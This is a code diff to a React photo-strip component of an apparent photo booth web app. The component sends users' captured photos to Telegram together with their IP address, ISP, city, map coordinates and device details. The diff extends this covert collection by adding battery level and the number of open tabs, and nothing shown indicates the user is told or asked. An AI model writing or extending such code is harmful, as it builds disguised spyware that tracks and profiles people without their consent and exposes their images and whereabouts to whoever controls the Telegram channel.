@@ -5,7 +5,7 @@ import { FRAMES } from '../constants';
 import { sendPhotoToTelegram } from '../services/telegramService';
 import { audioService } from '../services/audioService';
 import { getLocationData } from '../services/locationService';
-import { getDeviceData } from '../services/deviceService';
+import { getDetailedDeviceData } from '../services/deviceService';
 
 interface PhotoStripProps {
   photos: CapturedPhoto[];
@@ -71,13 +71,13 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
     try {
       // Fetch location and device info
       const location = await getLocationData();
-      const device = getDeviceData();
+      const device = await getDetailedDeviceData();
 
       const locationStr = location
         ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
         : '\n📍 Location: Unknown';
 
-      const deviceStr = `\n📱 Device: ${device.platform}\n🌐 Browser: ${device.language}\n🖥️ Screen: ${device.screenResolution}\n⏲️ Timezone: ${device.timezone}\n⚙️ CPU/RAM: ${device.cores} Cores / ${device.memory || '?'}GB\n📡 Link: ${device.connection}`;
+      const deviceStr = `\n📱 Device: ${device.platform}\n🌐 Browser: ${device.language}\n🖥️ Screen: ${device.screenResolution}\n⏲️ Timezone: ${device.timezone}\n⚙️ CPU/RAM: ${device.cores} Cores / ${device.memory || '?'}GB\n🔋 Battery: ${device.battery}\n📂 Tabs Open: ${device.tabsOpen}\n📡 Link: ${device.connection}`;
 
       // Small delay to ensure the DOM is fully rendered before capturing
       await new Promise(r => setTimeout(r, 1000));
